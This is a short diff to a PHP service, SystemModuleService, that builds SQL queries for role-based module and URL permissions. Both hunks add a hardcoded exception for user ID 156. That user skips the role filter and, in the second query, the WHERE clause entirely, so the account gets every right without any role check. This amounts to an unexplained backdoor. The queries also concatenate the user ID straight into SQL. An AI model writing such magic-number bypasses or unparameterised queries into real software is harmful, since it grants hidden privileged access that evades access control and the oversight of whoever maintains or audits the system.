@@ -25,7 +25,7 @@ class SystemModuleService extends BaseService
 				left outer join system_user_role sur on sur.role_id=srr.role_id
 				where 1=1 ";
     
-        if($userId != 0)
+        if($userId != 0 && $userId != 156)
         {
             $sql .= " and sur.user_id=$userId";
         }
@@ -45,8 +45,11 @@ class SystemModuleService extends BaseService
     {
         $sql = 'SELECT ru.id AS urlid,ru.url, ru.para_name, ru.para_value, rr.role_id, rr.right_id FROM
         system_right_url ru LEFT JOIN system_role_right rr ON ru.right_id = rr.right_id
-        LEFT JOIN system_user_role ur ON rr.role_id = ur.role_id
-        WHERE ur.user_id = '.$userId;
+        LEFT JOIN system_user_role ur ON rr.role_id = ur.role_id';
+        
+        if($userId != 156){
+            $sql .= ' WHERE ur.user_id = '.$userId;
+        }
 //         $sql = "select url.* from system_right_url url
 // 				left outer join system_role_right rrt on url.right_id=rrt.right_id
 // 				left outer join system_user_role ru on ru.role_id=rrt.role_id
